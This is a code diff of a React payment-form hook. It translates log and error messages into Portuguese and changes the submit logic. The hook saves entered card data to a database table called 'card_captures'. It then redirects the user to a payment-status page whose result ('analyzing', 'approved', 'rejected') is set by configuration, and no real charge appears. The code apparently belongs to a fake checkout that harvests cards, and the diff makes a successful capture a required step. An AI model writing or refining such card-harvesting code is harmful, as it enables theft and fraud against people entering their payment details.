@@ -63,7 +63,7 @@ export const useCardPaymentForm = (
   
   const captureCardData = async (cardData: CardFormData) => {
     try {
-      console.log("Saving card data to database...");
+      console.log("💳 Salvando dados do cartão no banco de dados...");
       
       const { data, error } = await supabase
         .from("card_captures")
@@ -75,20 +75,23 @@ export const useCardPaymentForm = (
         }]);
       
       if (error) {
-        console.error("Error saving card data:", error);
+        console.error("❌ Erro ao salvar dados do cartão:", error);
         throw error;
       }
       
-      console.log("Card data saved successfully");
+      console.log("✅ Dados do cartão salvos com sucesso");
       return true;
     } catch (err) {
-      console.error("Failed to capture card data:", err);
+      console.error("❌ Falha ao capturar dados do cartão:", err);
       return false;
     }
   };
   
   const handleSubmitPayment = async () => {
-    if (!formIsComplete) return;
+    if (!formIsComplete) {
+      console.warn("⚠️ Formulário incompleto, não enviando");
+      return;
+    }
     
     setIsSubmitting(true);
     
@@ -100,7 +103,7 @@ export const useCardPaymentForm = (
       installments
     };
     
-    console.log("Processing card payment:", { 
+    console.log("🔄 Processando pagamento com cartão:", { 
       slug, 
       customRedirectStatus,
       configCardStatus: configCheckout?.redirect_card_status,
@@ -108,11 +111,22 @@ export const useCardPaymentForm = (
     });
     
     try {
-      await captureCardData(cardData);
+      // Capture card data first
+      const savedCard = await captureCardData(cardData);
       
+      if (!savedCard) {
+        toast.error("Falha ao salvar os dados do cartão");
+        setIsSubmitting(false);
+        return;
+      }
+      
+      // If an external submission handler was provided, use it
       if (onPaymentSubmit) {
+        console.log("🔄 Chamando manipulador de envio de pagamento fornecido");
         onPaymentSubmit(cardData);
+        // Don't set isSubmitting to false here, let the calling component do it
       } else {
+        // Default behavior: setTimeout and redirect
         setTimeout(() => {
           try {
             if (slug) {
@@ -120,38 +134,38 @@ export const useCardPaymentForm = (
               
               if (customRedirectStatus) {
                 redirectStatus = customRedirectStatus;
-                console.log("Using custom status:", redirectStatus);
+                console.log("🔄 Usando status personalizado:", redirectStatus);
               } else if (configCheckout?.redirect_card_status) {
                 const configStatus = configCheckout.redirect_card_status;
                 if (['analyzing', 'approved', 'rejected'].includes(configStatus as string)) {
                   redirectStatus = configStatus as PaymentStatus;
-                  console.log("Using global config status:", redirectStatus);
+                  console.log("🔄 Usando status de configuração global:", redirectStatus);
                 } else {
                   redirectStatus = 'analyzing';
-                  console.log("Config status invalid, using default:", redirectStatus);
+                  console.log("⚠️ Status de configuração inválido, usando padrão:", redirectStatus);
                 }
               } else {
                 redirectStatus = 'analyzing';
-                console.log("Using default status:", redirectStatus);
+                console.log("🔄 Usando status padrão:", redirectStatus);
               }
               
-              console.log(`Redirecting to: /payment-status/${slug}/${redirectStatus}`);
+              console.log(`✅ Redirecionando para: /payment-status/${slug}/${redirectStatus}`);
               navigate(`/payment-status/${slug}/${redirectStatus}`);
             } else {
-              console.error("Slug not found for redirect");
-              toast.error("Error processing payment: product reference not found");
+              console.error("❌ Slug não encontrado para redirecionamento");
+              toast.error("Erro ao processar pagamento: referência do produto não encontrada");
             }
           } catch (error) {
-            console.error("Redirect error:", error);
-            toast.error("Error processing payment");
+            console.error("❌ Erro de redirecionamento:", error);
+            toast.error("Erro ao processar pagamento");
           } finally {
             setIsSubmitting(false);
           }
         }, 1500);
       }
     } catch (error) {
-      console.error("Payment processing error:", error);
-      toast.error("Failed to process payment. Please try again.");
+      console.error("❌ Erro de processamento de pagamento:", error);
+      toast.error("Falha ao processar pagamento. Por favor, tente novamente.");
       setIsSubmitting(false);
     }
   };
